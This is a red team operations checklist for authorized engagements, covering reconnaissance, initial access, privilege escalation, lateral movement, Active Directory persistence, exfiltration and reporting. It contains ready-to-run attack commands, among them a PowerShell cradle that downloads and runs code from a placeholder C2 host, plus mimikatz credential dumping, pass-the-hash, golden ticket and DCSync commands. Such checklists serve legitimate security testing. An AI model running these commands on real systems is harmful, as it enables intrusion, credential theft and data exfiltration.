# Red Team Operations Checklist

Comprehensive methodology for authorized red team engagements, from initial access to domain dominance.

---

## Phase 1: Pre-Engagement

### Rules of Engagement (RoE)
- [ ] Signed authorization with scope definition
- [ ] List of off-limits systems/users
- [ ] Time windows for active operations
- [ ] Communication protocols (emergency stop, status updates)
- [ ] Data handling procedures (what to exfiltrate, how to store)
- [ ] Get-out-of-jail-free cards (physical/digital)
- [ ] Deconfliction channels (avoid conflicts with blue team/IR)

### Objective Definition
- [ ] **Primary Objective:** e.g., "Access customer database"
- [ ] **Secondary Objectives:** e.g., "Dump Active Directory", "Maintain persistence"
- [ ] **Crown Jewels:** Identify critical assets (PII, source code, financial data)
- [ ] **Success Criteria:** Define what constitutes a successful engagement

### Team Setup
- [ ] Assign roles:
  - [ ] Team Lead (strategy, client communication)
  - [ ] Operator 1 (initial access, phishing)
  - [ ] Operator 2 (lateral movement, privesc)
  - [ ] Operator 3 (Active Directory, persistence)
- [ ] Set up infrastructure:
  - [ ] C2 servers (Cobalt Strike, Mythic, Sliver)
  - [ ] Redirectors (CDN, domain fronting)
  - [ ] Phishing infrastructure (GoPhish, Evilginx2)
  - [ ] VPNs/proxies for anonymization

---

## Phase 2: Reconnaissance

### Passive Recon (OSINT)
- [ ] **Domain Intelligence:**
  - [ ] WHOIS lookup, DNS records
  - [ ] Subdomain enumeration (`subfinder`, `amass`)
  - [ ] Certificate transparency logs (`crt.sh`)
  - [ ] Takeover vulnerability scan
- [ ] **Employee Intelligence:**
  - [ ] LinkedIn scraping (employees, titles, tech stack)
  - [ ] Email format discovery (Hunter.io, Snov.io)
  - [ ] Social media profiling (Twitter, Facebook, GitHub)
  - [ ] Credential leaks (HaveIBeenPwned, DeHashed)
- [ ] **Technical Intelligence:**
  - [ ] Technology stack (BuiltWith, Wappalyzer)
  - [ ] Cloud assets (S3 buckets, Azure blobs, GCS)
  - [ ] VPN/Webmail portals
  - [ ] Public-facing applications (Jira, GitLab, Jenkins)

### Active Recon
- [ ] **Network Scanning:**
  ```bash
  nmap -sS -sV -sC -O -p- <target_range>
  masscan -p1-65535 <target_range> --rate 10000
  ```
- [ ] **Web Application Scanning:**
  ```bash
  gobuster dir -u https://target.com -w wordlist.txt
  nikto -h https://target.com
  ```
- [ ] **Email Server Testing:**
  ```bash
  nmap -p 25,110,143,993,995 --script smtp-* <mail_server>
  ```

---

## Phase 3: Initial Access

### Phishing Campaigns
- [ ] **Spear Phishing:**
  - [ ] Craft personalized emails for high-value targets
  - [ ] Attach malicious documents (macros, DDE)
  - [ ] Link to credential harvesting pages
  - [ ] Use lookalike domains for credibility
- [ ] **Mass Phishing:**
  - [ ] Generic lures (password expiry, HR update)
  - [ ] Test email filtering effectiveness
  - [ ] Measure click/submission rates

### External Exploitation
- [ ] **Web Application Exploits:**
  - [ ] SQL injection → database access
  - [ ] File upload → web shell
  - [ ] RCE vulnerabilities (Log4j, Struts, etc.)
- [ ] **VPN Exploitation:**
  - [ ] Pulse Secure, Fortinet, Cisco ASA vulnerabilities
  - [ ] Default credentials on VPN portals
- [ ] **Public-Facing Services:**
  - [ ] Exploit unpatched services (Exchange, SharePoint)
  - [ ] Default credentials on admin panels

### Physical Access
- [ ] **Tailgating:** Follow employees into secure areas
- [ ] **USB Drops:** Plant malicious USBs in parking lot/lobby
- [ ] **Badge Cloning:** Clone RFID badges with Proxmark3
- [ ] **Impersonation:** Pose as IT/contractor/vendor

### Supply Chain Compromise
- [ ] Target third-party vendors with access
- [ ] Compromise software updates (if in scope)
- [ ] Exploit trusted relationships

---

## Phase 4: Post-Exploitation

### Establish Foothold
- [ ] **Deploy C2 Agent:**
  ```bash
  # Cobalt Strike beacon
  powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://c2.example.com/a'))"
  ```
- [ ] **Persistence Mechanisms:**
  - [ ] Scheduled tasks/cron jobs
  - [ ] Registry run keys (Windows)
  - [ ] Startup folders
  - [ ] WMI event subscriptions
  - [ ] Service creation
- [ ] **Credential Collection:**
  ```bash
  # Windows
  mimikatz sekurlsa::logonpasswords
  lsadump::lsa /inject
  
  # Linux
  cat /etc/shadow
  keychain_dump
  ```

### Privilege Escalation
- [ ] **Linux:**
  - [ ] SUID binaries (`find / -perm -4000`)
  - [ ] Sudo misconfigurations (`sudo -l`)
  - [ ] Kernel exploits (Dirty COW, Dirty Pipe)
  - [ ] Cron job exploitation
  - [ ] Capability abuse (`getcap -r /`)
- [ ] **Windows:**
  - [ ] Token impersonation (Incognito, JuicyPotato)
  - [ ] Unquoted service paths
  - [ ] DLL hijacking
  - [ ] AlwaysInstallElevated
  - [ ] Kernel exploits (PrintNightmare, SpoolSample)

### Internal Reconnaissance
- [ ] **Network Mapping:**
  ```bash
  # BloodHound ingestion
  SharpHound.exe -c All
  bloodhound-python -u user -p pass -d domain.local -dc <DC> -c All
  ```
- [ ] **Share Enumeration:**
  ```bash
  crackmapexec smb <subnet> -u user -p pass --shares
  ```
- [ ] **User/Group Discovery:**
  ```bash
  net user /domain
  net group "Domain Admins" /domain
  ```

---

## Phase 5: Lateral Movement

### Credential Reuse
- [ ] Test captured credentials on other systems
- [ ] Password spraying across domain
- [ ] Pass-the-Hash (PtH):
  ```bash
  crackmapexec smb <targets> -u user -H <NTLM_HASH>
  ```
- [ ] Pass-the-Ticket (PtT):
  ```bash
  mimikatz kerberos::ptt ticket.kirbi
  ```

### Remote Execution
- [ ] **PsExec:**
  ```bash
  impacket-psexec domain/user:pass@<target>
  ```
- [ ] **WMI:**
  ```bash
  impacket-wmiexec domain/user:pass@<target>
  ```
- [ ] **WinRM:**
  ```bash
  evil-winrm -i <target> -u user -p pass
  ```
- [ ] **DCOM:**
  ```powershell
  $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "<target>"))
  $dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c whoami", "7")
  ```
- [ ] **Scheduled Tasks:**
  ```bash
  schtasks /create /s <target> /tn update /tr "cmd.exe /c payload.exe" /ru SYSTEM /sc ONCE /st 00:00
  schtasks /run /s <target> /tn update
  ```

### Kerberos Attacks
- [ ] **Kerberoasting:**
  ```bash
  impacket-GetUserSPNs -dc-ip <DC> domain/user:pass -request
  ```
- [ ] **AS-REP Roasting:**
  ```bash
  impacket-GetNPUsers -dc-ip <DC> domain/ -usersfile users.txt -format hashcat
  ```
- [ ] **Golden Ticket:**
  ```bash
  mimikatz kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:<HASH> /id:500
  ```
- [ ] **Silver Ticket:**
  ```bash
  mimikatz kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /target:<SERVICE> /service:cifs /rc4:<HASH>
  ```
- [ ] **DCSync:**
  ```bash
  mimikatz lsadump::dcsync /domain:domain.local /user:krbtgt
  ```

### Living off the Land
- [ ] Use built-in tools to avoid detection:
  - **Windows:** PowerShell, WMI, PsExec, BITS, CertUtil
  - **Linux:** curl, wget, ssh, scp, cron, systemd

---

## Phase 6: Domain Dominance

### Active Directory Exploitation
- [ ] **ACL Abuse:**
  - [ ] GenericAll on user → reset password
  - [ ] GenericWrite on group → add user
  - [ ] WriteDacl → grant full control
  - [ ] ForceChangePassword → reset any password
- [ ] **Delegation Attacks:**
  - [ ] Unconstrained delegation → capture TGTs
  - [ ] Constrained delegation → request TGS
  - [ ] Resource-Based Constrained Delegation (RBCD)
- [ ] **Group Policy Abuse:**
  - [ ] Modify GPOs to execute code
  - [ ] Deploy malicious scripts via GPO preferences

### Persistence
- [ ] **Golden/Silver Tickets:** Long-term domain access
- [ ] **DCShadow:** Register rogue DC for persistence
- [ ] **AdminSDHolder:** Modify to maintain admin access
- [ ] **Skeleton Key:** Inject master key into LSASS
- [ ] **Backdoor Accounts:** Create hidden admin users
- [ ] **GPO Modifications:** Persistent code execution

### Data Exfiltration
- [ ] Identify crown jewels:
  - [ ] Customer databases (PII, payment data)
  - [ ] Source code repositories
  - [ ] Financial records
  - [ ] Intellectual property
- [ ] Exfiltrate via:
  - [ ] Encrypted channels (HTTPS, DNS tunneling)
  - [ ] Cloud storage (upload to personal AWS/GDrive)
  - [ ] Steganography (hide data in images)
  - [ ] Email attachments (if DLP is weak)

---

## Phase 7: Cleanup & Reporting

### Artifact Removal
- [ ] Remove C2 agents/beacons
- [ ] Delete created user accounts
- [ ] Restore modified GPOs/ACLs
- [ ] Clear event logs (if instructed)
- [ ] Remove scheduled tasks/services
- [ ] Uninstall malicious tools

### Documentation
- [ ] **Attack Chain Documentation:**
  - [ ] Timeline of all actions
  - [ ] Commands executed
  - [ ] Credentials captured
  - [ ] Systems compromised
- [ ] **Evidence Collection:**
  - [ ] Screenshots of flags/critical data
  - [ ] C2 session logs
  - [ ] Network captures (if applicable)
- [ ] **Metrics:**
  - [ ] Time to initial access
  - [ ] Time to domain admin
  - [ ] Time to crown jewels
  - [ ] Detection rate (if blue team is active)

### Reporting
- [ ] **Executive Summary:** High-level findings, business impact
- [ ] **Technical Report:** Detailed attack chain, IOCs, TTPs
- [ ] **Remediation Plan:** Prioritized recommendations
- [ ] **Lessons Learned:** What worked, what didn't

---

## Tools Summary

| Category | Tools |
|----------|-------|
| C2 Frameworks | Cobalt Strike, Mythic, Sliver, Empire |
| Phishing | GoPhish, Evilginx2, Social Engineer Toolkit |
| Recon | BloodHound, SharpHound, CrackMapExec, Nmap |
| Exploitation | Metasploit, Impacket, ProxyChains |
| Credential Attacks | Mimikatz, Rubeus, Hashcat, John |
| Lateral Movement | PsExec, WMI, WinRM, DCOM, Evil-WinRM |
| Persistence | SharPersist, PowerSploit, Nishang |

---

## MITRE ATT&CK Mapping

Map TTPs to MITRE ATT&CK for structured reporting:
- **Initial Access:** T1566 (Phishing), T1190 (Exploit Public App)
- **Execution:** T1059 (Command & Scripting Interpreter)
- **Persistence:** T1053 (Scheduled Task), T1547 (Boot Logon)
- **Privilege Escalation:** T1134 (Access Token Manipulation)
- **Defense Evasion:** T1070 (Indicator Removal)
- **Credential Access:** T1003 (OS Credential Dumping)
- **Lateral Movement:** T1021 (Remote Services)
- **Collection:** T1005 (Data from Local System)
- **Exfiltration:** T1041 (Exfiltration Over C2 Channel)

---

*Last updated: 2026-04-06*
